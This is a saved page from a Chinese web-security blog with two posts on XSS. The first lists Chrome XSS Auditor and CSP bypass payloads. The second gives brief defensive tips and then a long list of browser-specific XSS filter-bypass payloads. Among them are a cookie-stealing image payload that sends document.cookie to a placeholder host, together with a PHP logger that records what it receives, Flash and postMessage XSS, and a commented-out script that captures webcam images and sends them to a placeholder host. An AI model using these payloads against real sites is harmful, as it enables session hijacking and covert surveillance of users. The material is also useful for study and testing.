<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="keywords" content="网络安全,黑客,JAVA安全,代码审计,渗透测试,入侵,SRC,扫描,WEB安全,移动安全,PHP">
    <meta name="description" content="蓝骨, langu.xyz">
    <meta name="author" content="langu_xyz">
    
        <title>
            
                        langu_xyz
        </title>
        
<link rel="stylesheet" href="/css/style.css">

            <link rel="shortcut icon" href="/images/logo.jpeg">
                
<link rel="stylesheet" href="/css/font-awesome.min.css">

                    <script id="hexo-configurations">
    let KEEP = window.KEEP || {};
    KEEP.hexo_config = {"hostname":"blog.langu.xyz","root":"/","language":"zh","path":"search.json"};
    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/images/logo.jpeg","favicon":"/images/logo.jpeg","article_img_align":"center","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":false},"first_screen":{"enable":true,"background_img":"/images/shamo.jpg","description":"XYZ(无限未来)"},"scroll":{"progress_bar":{"enable":true},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":true},"lazyload":{"enable":true},"version":"3.4.3"};
    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
  </script>

                    <script>
                        var _hmt = _hmt || [];
                        (function() {
                          var hm = document.createElement("script");
                          hm.src = "https://hm.baidu.com/hm.js?1cd6e64ff252acf24b707985fcec8850";
                          var s = document.getElementsByTagName("script")[0]; 
                          s.parentNode.insertBefore(hm, s);
                        })();
                        </script>
                        
<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="langu_xyz" type="application/atom+xml">
</head>
<body>
<div class="progress-bar-container">
    
        <span class="scroll-progress-bar"></span>
    

    
        <span class="pjax-progress-bar"></span>
        <span class="pjax-progress-icon">
            <i class="fas fa-circle-notch fa-spin"></i>
        </span>
    
</div>


<main class="page-container">

    

    <div class="page-main-content">

        <div class="page-main-content-top">
            <header class="header-wrapper">

    <div class="header-content">
        <div class="left">
            
                    <a class="logo-title" href="/">
                        langu_xyz
                    </a>
        </div>

        <div class="right">
            <div class="pc">
                <ul class="menu-list">
                    
                        <li class="menu-item">
                            <a class="active" href="/" >
                                HOME
                            </a>
                        </li>
                        
                        <li class="menu-item">
                            <a class="" href="/tags/THINK/" >
                                THINK
                            </a>
                        </li>
                        
                            
                                <li class="menu-item search search-popup-trigger">
                                    <i class="fas fa-search"></i>
                                </li>
                                
                                
                </ul>
            </div>
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                    
                        <div class="icon-item menu-bar">
                            <div class="menu-bar-middle"></div>
                        </div>
            </div>
        </div>
    </div>

    <div class="header-drawer">
        <ul class="drawer-menu-list">
            
                <li class="drawer-menu-item flex-center">
                    <a class="active" href="/" >
                        HOME
                    </a>
                </li>
                
                <li class="drawer-menu-item flex-center">
                    <a class="" href="/tags/THINK/" >
                        THINK
                    </a>
                </li>
                
        </ul>
    </div>

    <div class="window-mask"></div>

</header>
        </div>

        <div class="page-main-content-middle">

            <div class="main-content">

                
                    <div class="home-content-container fade-in-down-animation">
    <ul class="home-article-list">
        
            <li class="home-article-item">

                

                <h3 class="home-article-title">
                    <a href="/Chrome%20XSS%20Auditor%20Bypass%20Payload/">
                        Chrome XSS Auditor Bypass Payload
                    </a>
                </h3>

                <!-- <div class="home-article-content markdown-body">
                    
                        测试版本：

测试环境：

===============================
不需要交互http://115.159.0.191:8080/xss1.php?x=1%22%3E%3Cbr%3E%00%00%00%00%00%00%00%3Cscript%3Ealert%281%29%3C%2fscript%3E
http://115.159.0.191:8080/xss1.php?x=1%22%3E%3Cmeta%20charset=ISO-2022-JP%3E%3Csvg%20onload%1B%28B=alert(1)%3E
https://vulnerabledoma.in/char_test?body=%3Cobject%20allowscriptaccess=always%3E%20%3Cparam%20name=url%20value=https://l0.cm/xss.swf%3E




CSP bypass via jQuery Gadget
12345678910111213141516171819&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;content-security-policy&quot; content=&quot;script-src &#x27;nonce-random&#x27; &#x27;strict-dynamic&#x27;;&quot;&gt;&lt;script nonce=random src=&quot;https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.js&quot;&gt;&lt;/script&gt;&lt;script nonce=random&gt;$(document).ready(function()&#123;    // code taken from http://api.jquery.com/after/    $( &quot;.container&quot; ).after( $( &quot;.child&quot; ) );&#125;);&lt;/script&gt;&lt;/head&gt;&lt;body&gt;XSS XSS XSS&lt;form class=&quot;child&quot;&gt;&lt;input name=&quot;ownerDocument&quot;/&gt;&lt;script&gt;alert(1);&lt;/script&gt;&lt;/form&gt;XSS XSS XSS&lt;p class=&quot;container&quot;&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;



需要交互http://115.159.0.191:8080/xss1.php?x=1%22%3E%3Csvg%20width%3D10000px%20height%3D10000px%3E%3Ca%3E%3Crect%20width%3D10000px%20height%3D10000px%20z-index%3D9999999%20%2F%3E%3Canimate%20attributeName%3Dhref%20values%3Djavas%26%2399ript%3Aalert%281%29%3E
https://vulnerabledoma.in/xss_auditortest?test=5&amp;q=%3Ca%20href=/**/alert%281%29%3ECLICK%3C/a%3E%3Cbase%20href=%22javascript:%5C

                    
                </div> -->
                <div class="article-content markdown-body">
                    <p>测试版本：</p>
<p><img lazyload src="/images/loading.svg" data-src="15190502977118.png"></p>
<p>测试环境：</p>
<p><img lazyload src="/images/loading.svg" data-src="15190503057849.png"></p>
<p>===============================</p>
<h3 id="不需要交互"><a href="#不需要交互" class="headerlink" title="不需要交互"></a>不需要交互</h3><p><a class="link" target="_blank" rel="noopener" href="http://115.159.0.191:8080/xss1.php?x=1%22%3E%3Cbr%3E%00%00%00%00%00%00%00%3Cscript%3Ealert(1)%3C/script%3E">http://115.159.0.191:8080/xss1.php?x=1%22%3E%3Cbr%3E%00%00%00%00%00%00%00%3Cscript%3Ealert%281%29%3C%2fscript%3E<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link" target="_blank" rel="noopener" href="http://115.159.0.191:8080/xss1.php?x=1%22%3E%3Cmeta%20charset=ISO-2022-JP%3E%3Csvg%20onload%1B(B=alert(1)%3E">http://115.159.0.191:8080/xss1.php?x=1%22%3E%3Cmeta%20charset=ISO-2022-JP%3E%3Csvg%20onload%1B%28B=alert(1)%3E<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link" target="_blank" rel="noopener" href="https://vulnerabledoma.in/char_test?body=%3Cobject%20allowscriptaccess=always%3E%20%3Cparam%20name=url%20value=https://l0.cm/xss.swf%3E">https://vulnerabledoma.in/char_test?body=%3Cobject%20allowscriptaccess=always%3E%20%3Cparam%20name=url%20value=https://l0.cm/xss.swf%3E<i class="fas fa-external-link-alt"></i></a></p>
<script src="”http://example.com/jsonp?callback=alert(1);//”"></script>



<p><code>CSP bypass via jQuery Gadget</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;content-security-policy&quot; content=&quot;script-src &#x27;nonce-random&#x27; &#x27;strict-dynamic&#x27;;&quot;&gt;</span><br><span class="line">&lt;script nonce=random src=&quot;https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script nonce=random&gt;</span><br><span class="line">$(document).ready(function()&#123;</span><br><span class="line">    // code taken from http://api.jquery.com/after/</span><br><span class="line">    $( &quot;.container&quot; ).after( $( &quot;.child&quot; ) );</span><br><span class="line">&#125;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">XSS XSS XSS</span><br><span class="line">&lt;form class=&quot;child&quot;&gt;&lt;input name=&quot;ownerDocument&quot;/&gt;&lt;script&gt;alert(1);&lt;/script&gt;&lt;/form&gt;</span><br><span class="line">XSS XSS XSS</span><br><span class="line">&lt;p class=&quot;container&quot;&gt;&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>



<h3 id="需要交互"><a href="#需要交互" class="headerlink" title="需要交互"></a>需要交互</h3><p><a class="link" target="_blank" rel="noopener" href="http://115.159.0.191:8080/xss1.php?x=1%22%3E%3Csvg%20width=10000px%20height=10000px%3E%3Ca%3E%3Crect%20width=10000px%20height=10000px%20z-index=9999999%20/%3E%3Canimate%20attributeName=href%20values=javas&%2399ript:alert(1)%3E">http://115.159.0.191:8080/xss1.php?x=1%22%3E%3Csvg%20width%3D10000px%20height%3D10000px%3E%3Ca%3E%3Crect%20width%3D10000px%20height%3D10000px%20z-index%3D9999999%20%2F%3E%3Canimate%20attributeName%3Dhref%20values%3Djavas%26%2399ript%3Aalert%281%29%3E<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link" target="_blank" rel="noopener" href="https://vulnerabledoma.in/xss_auditortest?test=5&amp;q=%3Ca%20href=/**/alert(1)%3ECLICK%3C/a%3E%3Cbase%20href=%22javascript:%5C">https://vulnerabledoma.in/xss_auditortest?test=5&amp;q=%3Ca%20href=/**/alert%281%29%3ECLICK%3C/a%3E%3Cbase%20href=%22javascript:%5C<i class="fas fa-external-link-alt"></i></a></p>

                </div>

                <div class="home-article-meta-info-container">
    <div class="home-article-meta-info">
        <span><i class="fas fa-history"></i>&nbsp;<span class="home-article-date" data-date="Mon May 22 2017 21:00:00 GMT+0800">2017-05-22</span></span>
        
            <span class="home-article-category"><i class="fas fa-folder"></i>&nbsp;
                <ul>
                    
                        <li>
                            
                            <a href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a>&nbsp;
                        </li>
                    
                    
                </ul>
            </span>
        
        
            <span class="home-article-tag">
                <i class="fas fa-tags"></i>&nbsp;
                <ul>
                    
                        <li>
                            
                            <a href="/tags/XSS/">XSS</a>&nbsp;
                        </li>
                    
                </ul>
            </span>
        
    </div>

    <a href="/Chrome%20XSS%20Auditor%20Bypass%20Payload/">Read more&nbsp;<i class="fas fa-angle-right"></i></a>
</div>

            </li>
        
            <li class="home-article-item">

                

                <h3 class="home-article-title">
                    <a href="/XSS%20Tips%20%E5%8F%8A%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88/">
                        XSS Tips 及修复方案
                    </a>
                </h3>

                <!-- <div class="home-article-content markdown-body">
                    
                        关于一些XSS防御的方法
JSON/JSONP 接口不规范导致 XSS123callback 未转义导致 XSSJSONP 输出开头未换行导致 flash 构造攻击JSON/JSONP 键值未转义导致 XSS
解决方案：
1234后端通过 token 或 referer 检查防止 CSRF对 callback 字段的输出进行限制，对 JSON 内容的键值进行转义，上文中的escapeJsonContentType 标准化JSONP输出最前面加了两个 \r\n 防止 flash 构造攻击

前端模版里的变量展示方式错误导致 XSS通过预定义函数转义或者利用安全包过滤
前端代码不规范导致 DOM XSS关键问题在于把数据插入到 DOM 的时候，没有做转义或者过滤
需要转义五个字符: &lt; &gt; &#39; &quot; &amp; ，漏掉其中任何一个都有可能导致问题。
富文本1234567解析html，得到所有的html标签和属性。对于不在白名单中的标签，直接删除或者转义。属性值里面的特殊字符要进行转义，防止跃出。比如&lt;img width=&quot;100&quot;&gt;如果我修改100为100&quot; onerror=alert(1)&quot;就变成了&lt;img width=&quot;100&quot; onerror=alert(1)&quot;&quot;&gt;了。对于部分引入外链的属性，如src,href等判断链接是否合法，过滤&lt;a href=javascript:alert(1)&gt;的情况，而且最好是只能使用指定域名下的外链。嵌入falsh的embed标签设置allowscriptaccess=never，allownetworking=none

后台盲打XSS除常规方案外，后台页面要求配置禁止外部链接的CSP策略，确保即使存在漏洞，一般的外部攻击也无法利用。应用所有页面，在response的http头中，都需要附加上CSP策略
=========================


这几天在玩AFSRC的xss漏洞比赛，虽然构造出了许多绕过方法，奈何手速太慢，重复率太感人，在这开一篇，记录下日常遇到的tips




%00(%0f)截断：


适用：IE 6
1&lt;scri%00pt&gt;alert(1);&lt;/scri%00pt&gt;





IE11 ASP.NET  Request Validator bypass:


&lt;% style=behavior:url(: onreadystatechange=alert(1)&gt;


mhtml:https(IE 8)


&lt;iframe src=mhtml:https://louchaooo.github.io/life.html!html&gt;&lt;/iframe&gt;


IE8


&lt;comment&gt;&lt;img src=&quot;&lt;/comment&gt;&lt;img src=x onerror=alert(1)//&quot;&gt;


marquee onStart marquee onStart 重复标签绕过


&lt;marquee onStart marquee onStart=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/marquee onStart&gt;


IE6


&lt;STYLE&gt;li &#123;list-style-image: url(&quot;javascript:alert(&#39;styleeeeeeee&#39;)&quot;);&#125;&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;111&lt;/br&gt;


IE 8


&quot;&gt;&lt;!--[if&lt;img src=x onerror=javascript:alert(1)//]&gt; --&gt;


IE 8


&lt;!--[if]&gt;&lt;script&gt;javascript:alert(1)&lt;/script --&gt;


IE 8


&lt;div style=&quot;color:rgb(&#39;&#39;&amp;#0;x:expression(alert(1))&quot;&gt;&lt;/div&gt;


IE 7


&lt;s%00c%00r%00%00ip%00t&gt;confirm(1);&lt;/s%00c%00r%00%00ip%00t&gt;


编码绕过


&quot;&gt;&lt;DIV STYLE=&quot;width:\0065\0078\0070\0072\0065\0073\0073\0069\006F\006E\0028\0070\0072\006F\006D\0070\0074\0028\0031\0029\0029&quot;&gt;


IE 7


&lt;div style=&quot;x:expression(alert(1))&quot;&gt;Joker&lt;/div&gt;

还有一些，无非也是浏览器特性，就先不放这了
============一些其它的paylaod============探针
&#39;&#39;;!--&quot;&lt;XSS&gt;=&amp;&#123;()&#125;
&lt;!--&lt;img src=&quot;--&gt;&lt;img src=x onerror= (alert)(/xss/)//&quot;&gt;
&lt;iframe src=javascript:alert(&#39;xss&#39;);height=0 width=0 /&gt;&lt;iframe&gt; 过滤掉on事件
[img]javascript:alert1//http://url/onerror=//a_/img/default/usr50.gif[/img]
&lt;link type=&#39;application/json+oembed&#39; href=&#39;http://ip/oembed.json&#39;&gt;
1234567&#123;        &quot;type&quot;: &quot;image&quot;,        &quot;image&quot;: &quot;xss&quot;,        &quot;description&quot;: &quot;descr&#x27; onerror=&#x27;alert(/XSS by skavans/)&quot;,        &quot;image_width&quot;: 1,        &quot;image_height&quot;: 1&#125;
============盗取cookie=============1、xss平台2、a.php &lt;?php fwrite(fopen(&#39;ali.txt&#39;,&#39;a&#39;),$GET[&#39;c&#39;]).&#39;\r\n&#39;; ?&gt;xss payload &lt;img src=&quot;1&quot; onerror=&quot;var a=new Image;a.src=&quot;http://IP/a.php?c=&#39;+document.cookie+&#39;---&#39;+location.pathname&quot;&gt;
===========比较短的payload==========
&lt;iframe&gt;(8)
&quot;onload=&#39;(alert)(8)&#39;//&gt;
=============Flash Xss=============The ZeroClipboard.swf and ZeroClipboard10.swf are vulnerable to XSS attack, example:http://website/js/ZeroClipboard.swf#?id=\&quot;))}catch(e){alert(/XSS/.source);}//&amp;width=500&amp;height=500http://website/js/ZeroClipboard10.swf#?id=\&quot;))}catch(e){alert(/XSS/.source);}//&amp;width=500&amp;height=500http://website/js/ZeroClipboard.swf?id=\&quot;))}catch(e){alert(/XSS/.source);}//&amp;width=500&amp;height=500http://website/js/ZeroClipboard10.swf?id=\&quot;))}catch(e){alert(/XSS/.source);}//&amp;width=500&amp;height=500
vulnerable code:
public function ZeroClipboard(){….var flashvars:Object = LoaderInfo(this.root.loaderInfo).parameters;id = flashvars.id;….ExternalInterface.call(“ZeroClipboard.dispatch”, id, “load”, null);
this files get a id parameter from url and passed it to second parameter inside ExternalInterface.call without any validation(only numbers) or proper escaping\encoding).
==========html5===========
123456&lt;script type=&quot;text/javascript&quot;&gt;function xss() &#123;    window[0].postMessage(&#123; redirectURL: &quot;javascript:alert(/xss/)&quot; &#125;, &quot;*&quot;)&#125;&lt;/script&gt;&lt;iframe src=&quot;https://xxxxxx/ilogin_2.htm&quot; onload=&quot;xss()&quot;&gt;&lt;/iframe&gt;

===========绕过chrome auditor的payload========&lt;script&gt;alert(&#39;evil&#39;)&lt;/script
===================
No space  and  No Slash :
&lt;svg•onload=alert(1)&gt;  %0Chttps://markitzeroday.com/character-restrictions/xss/2017/07/26/xss-without-dots.html
跳出&lt;input&gt;标签&quot;&gt;
==========XSS in Mobile Devices==========
123456789101112131415161718192021222324252627282930&lt;body onorientationchange=alert(orientation)&gt;&lt;html ontouchstart=alert(1)&gt;&lt;html ontouchend=alert(1)&gt;&lt;html ontouchmove=alert(1)&gt;&lt;html ontouchcancel=alert(1)&gt;&lt;svg onload=alert(navigator.connection.type)&gt;&lt;svg onload=alert(navigator.battery.level)&gt;&lt;svg onload=alert(navigator.battery.dischargingTime)&gt;&lt;svg onload=alert(navigator.battery.charging)&gt;&lt;script&gt;navigator.geolocation.getCurrentPosition(function(p)&#123;alert(&#x27;Latitude:&#x27;+p.coords.latitude+&#x27;,Longitude:&#x27;+p.coords.longitude+&#x27;,Altitude:&#x27;+p.coords.altitude);&#125;)&lt;/script&gt;(remember to change “+” for “%2B” in URLs)&lt;script&gt;d=document;v=d.createElement(‘video’);c=d.createElement(‘canvas’);c.width=640;c.height=480;navigator.webkitGetUserMedia(&#123;‘video’:true&#125;,function(s)&#123;v.src=URL.createObjectURL(s);v.play()&#125;,function()&#123;&#125;);c2=c.getContext(‘2d’);x=’c2.drawImage(v,0,0,640,480);fetch(“//HOST/”+c2.canvas.toDataURL())‘;setInterval(x,5000);&lt;/script&gt;open(c2.canvas.toDataURL())&lt;svg onload=navigator.vibrate(500)&gt;&lt;svg onload=navigator.vibrate([500,300,100])&gt;



                    
                </div> -->
                <div class="article-content markdown-body">
                    <p>关于一些XSS防御的方法</p>
<h4 id="JSON-JSONP-接口不规范导致-XSS"><a href="#JSON-JSONP-接口不规范导致-XSS" class="headerlink" title="JSON/JSONP 接口不规范导致 XSS"></a>JSON/JSONP 接口不规范导致 XSS</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">callback 未转义导致 XSS</span><br><span class="line">JSONP 输出开头未换行导致 flash 构造攻击</span><br><span class="line">JSON/JSONP 键值未转义导致 XSS</span><br></pre></td></tr></table></figure>
<p>解决方案：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">后端通过 token 或 referer 检查防止 CSRF</span><br><span class="line">对 callback 字段的输出进行限制，对 JSON 内容的键值进行转义，上文中的escapeJson</span><br><span class="line">ContentType 标准化</span><br><span class="line">JSONP输出最前面加了两个 \r\n 防止 flash 构造攻击</span><br></pre></td></tr></table></figure>

<h4 id="前端模版里的变量展示方式错误导致-XSS"><a href="#前端模版里的变量展示方式错误导致-XSS" class="headerlink" title="前端模版里的变量展示方式错误导致 XSS"></a>前端模版里的变量展示方式错误导致 XSS</h4><p>通过预定义函数转义或者利用安全包过滤</p>
<h4 id="前端代码不规范导致-DOM-XSS"><a href="#前端代码不规范导致-DOM-XSS" class="headerlink" title="前端代码不规范导致 DOM XSS"></a>前端代码不规范导致 DOM XSS</h4><p>关键问题在于把数据插入到 DOM 的时候，没有做转义或者过滤</p>
<p>需要转义五个字符: <code>&lt; &gt; &#39; &quot; &amp;</code> ，漏掉其中任何一个都有可能导致问题。</p>
<h4 id="富文本"><a href="#富文本" class="headerlink" title="富文本"></a>富文本</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">解析html，得到所有的html标签和属性。对于不在白名单中的标签，直接删除或者转义。</span><br><span class="line"></span><br><span class="line">属性值里面的特殊字符要进行转义，防止跃出。比如&lt;img width=&quot;100&quot;&gt;如果我修改100为100&quot; onerror=alert(1)&quot;就变成了&lt;img width=&quot;100&quot; onerror=alert(1)&quot;&quot;&gt;了。</span><br><span class="line"></span><br><span class="line">对于部分引入外链的属性，如src,href等判断链接是否合法，过滤&lt;a href=javascript:alert(1)&gt;的情况，而且最好是只能使用指定域名下的外链。</span><br><span class="line"></span><br><span class="line">嵌入falsh的embed标签设置allowscriptaccess=never，allownetworking=none</span><br></pre></td></tr></table></figure>

<h4 id="后台盲打XSS"><a href="#后台盲打XSS" class="headerlink" title="后台盲打XSS"></a>后台盲打XSS</h4><p>除常规方案外，后台页面要求配置禁止外部链接的CSP策略，确保即使存在漏洞，一般的外部攻击也无法利用。应用所有页面，在response的http头中，都需要附加上CSP策略</p>
<p>=========================</p>
<blockquote>
<blockquote>
<p>这几天在玩AFSRC的xss漏洞比赛，虽然构造出了许多绕过方法，奈何手速太慢，重复率太感人，在这开一篇，记录下日常遇到的tips</p>
</blockquote>
</blockquote>
<blockquote>
<blockquote>
<p>%00(%0f)截断：</p>
</blockquote>
</blockquote>
<p>适用：IE 6</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scri%00pt&gt;alert(1);&lt;/scri%00pt&gt;</span><br></pre></td></tr></table></figure>



<blockquote>
<blockquote>
<p>IE11 ASP.NET  Request Validator bypass:</p>
</blockquote>
</blockquote>
<p><code>&lt;% style=behavior:url(: onreadystatechange=alert(1)&gt;</code></p>
<blockquote>
<blockquote>
<p>mhtml:https(IE 8)</p>
</blockquote>
</blockquote>
<p><code>&lt;iframe src=mhtml:https://louchaooo.github.io/life.html!html&gt;&lt;/iframe&gt;</code></p>
<blockquote>
<blockquote>
<p>IE8</p>
</blockquote>
</blockquote>
<p><code>&lt;comment&gt;&lt;img src=&quot;&lt;/comment&gt;&lt;img src=x onerror=alert(1)//&quot;&gt;</code></p>
<blockquote>
<blockquote>
<p>marquee onStart marquee onStart 重复标签绕过</p>
</blockquote>
</blockquote>
<p><code>&lt;marquee onStart marquee onStart=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/marquee onStart&gt;</code></p>
<blockquote>
<blockquote>
<p>IE6</p>
</blockquote>
</blockquote>
<p><code>&lt;STYLE&gt;li &#123;list-style-image: url(&quot;javascript:alert(&#39;styleeeeeeee&#39;)&quot;);&#125;&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;111&lt;/br&gt;</code></p>
<blockquote>
<blockquote>
<p>IE 8</p>
</blockquote>
</blockquote>
<p><code>&quot;&gt;&lt;!--[if&lt;img src=x onerror=javascript:alert(1)//]&gt; --&gt;</code></p>
<blockquote>
<blockquote>
<p>IE 8</p>
</blockquote>
</blockquote>
<p><code>&lt;!--[if]&gt;&lt;script&gt;javascript:alert(1)&lt;/script --&gt;</code></p>
<blockquote>
<blockquote>
<p>IE 8</p>
</blockquote>
</blockquote>
<p><code>&lt;div style=&quot;color:rgb(&#39;&#39;&amp;#0;x:expression(alert(1))&quot;&gt;&lt;/div&gt;</code></p>
<blockquote>
<blockquote>
<p>IE 7</p>
</blockquote>
</blockquote>
<p><code>&lt;s%00c%00r%00%00ip%00t&gt;confirm(1);&lt;/s%00c%00r%00%00ip%00t&gt;</code></p>
<blockquote>
<blockquote>
<p>编码绕过</p>
</blockquote>
</blockquote>
<p><code>&quot;&gt;&lt;DIV STYLE=&quot;width:\0065\0078\0070\0072\0065\0073\0073\0069\006F\006E\0028\0070\0072\006F\006D\0070\0074\0028\0031\0029\0029&quot;&gt;</code></p>
<blockquote>
<blockquote>
<p>IE 7</p>
</blockquote>
</blockquote>
<p><code>&lt;div style=&quot;x:expression(alert(1))&quot;&gt;Joker&lt;/div&gt;</code></p>
<p><img lazyload src="/images/loading.svg" data-src="15191848214155.png"><br><img lazyload src="/images/loading.svg" data-src="https://cloud.githubusercontent.com/assets/12745454/26583330/5db8851e-4577-11e7-864b-5ee0634969d4.png" alt="firefox"></p>
<p>还有一些，无非也是浏览器特性，就先不放这了</p>
<p>============一些其它的paylaod============<br>探针</p>
<p><code>&#39;&#39;;!--&quot;&lt;XSS&gt;=&amp;&#123;()&#125;</code></p>
<p><code>&lt;!--&lt;img src=&quot;--&gt;&lt;img src=x onerror= (alert)(/xss/)//&quot;&gt;</code></p>
<p><code>&lt;iframe src=javascript:alert(&#39;xss&#39;);height=0 width=0 /&gt;&lt;iframe&gt;</code> 过滤掉on事件</p>
<p><code>[img]javascript:alert</code>1<code>//http://url/onerror=//a_/img/default/usr50.gif[/img]</code></p>
<p><code>&lt;link type=&#39;application/json+oembed&#39; href=&#39;http://ip/oembed.json&#39;&gt;</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">        &quot;type&quot;: &quot;image&quot;,</span><br><span class="line">        &quot;image&quot;: &quot;xss&quot;,</span><br><span class="line">        &quot;description&quot;: &quot;descr&#x27; onerror=&#x27;alert(/XSS by skavans/)&quot;,</span><br><span class="line">        &quot;image_width&quot;: 1,</span><br><span class="line">        &quot;image_height&quot;: 1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>============盗取cookie=============<br>1、xss平台<br>2、<br>a.php <code>&lt;?php fwrite(fopen(&#39;ali.txt&#39;,&#39;a&#39;),$GET[&#39;c&#39;]).&#39;\r\n&#39;; ?&gt;</code><br>xss payload <code>&lt;img src=&quot;1&quot; onerror=&quot;var a=new Image;a.src=&quot;http://IP/a.php?c=&#39;+document.cookie+&#39;---&#39;+location.pathname&quot;&gt;</code></p>
<p>===========比较短的payload==========</p>
<p><code>&lt;iframe&gt;(8)</code></p>
<p><code>&quot;onload=&#39;(alert)(8)&#39;//&gt;</code></p>
<p>=============Flash Xss=============<br>The ZeroClipboard.swf and ZeroClipboard10.swf are vulnerable to XSS attack, example:<br><a class="link" target="_blank" rel="noopener" href="http://website/js/ZeroClipboard.swf#?id=\&quot;))}catch(e){alert(/XSS/.source);}//&amp;width=500&amp;height=500">http://website/js/ZeroClipboard.swf#?id=\&quot;))}catch(e){alert(/XSS/.source);}//&amp;width=500&amp;height=500<i class="fas fa-external-link-alt"></i></a><br><a class="link" target="_blank" rel="noopener" href="http://website/js/ZeroClipboard10.swf#?id=\&quot;))}catch(e){alert(/XSS/.source);}//&amp;width=500&amp;height=500">http://website/js/ZeroClipboard10.swf#?id=\&quot;))}catch(e){alert(/XSS/.source);}//&amp;width=500&amp;height=500<i class="fas fa-external-link-alt"></i></a><br><a class="link" target="_blank" rel="noopener" href="http://website/js/ZeroClipboard.swf?id=%5C&quot;))%7Dcatch(e)%7Balert(/XSS/.source);%7D//&amp;width=500&amp;height=500">http://website/js/ZeroClipboard.swf?id=\&quot;))}catch(e){alert(/XSS/.source);}//&amp;width=500&amp;height=500<i class="fas fa-external-link-alt"></i></a><br><a class="link" target="_blank" rel="noopener" href="http://website/js/ZeroClipboard10.swf?id=%5C&quot;))%7Dcatch(e)%7Balert(/XSS/.source);%7D//&amp;width=500&amp;height=500">http://website/js/ZeroClipboard10.swf?id=\&quot;))}catch(e){alert(/XSS/.source);}//&amp;width=500&amp;height=500<i class="fas fa-external-link-alt"></i></a></p>
<p>vulnerable code:</p>
<p>public function ZeroClipboard(){<br>….<br>var flashvars:Object = LoaderInfo(this.root.loaderInfo).parameters;<br>id = flashvars.id;<br>….<br>ExternalInterface.call(“ZeroClipboard.dispatch”, id, “load”, null);</p>
<p>this files get a id parameter from url and passed it to second parameter inside ExternalInterface.call without any validation(only numbers) or proper escaping\encoding).</p>
<p>==========html5===========</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">function xss() &#123;</span><br><span class="line">    window[0].postMessage(&#123; redirectURL: &quot;javascript:alert(/xss/)&quot; &#125;, &quot;*&quot;)</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;iframe src=&quot;https://xxxxxx/ilogin_2.htm&quot; onload=&quot;xss()&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>

<p>===========绕过chrome auditor的payload========<br><code>&lt;script&gt;alert(&#39;evil&#39;)&lt;/script</code></p>
<p>===================</p>
<p>No space  and  No Slash :</p>
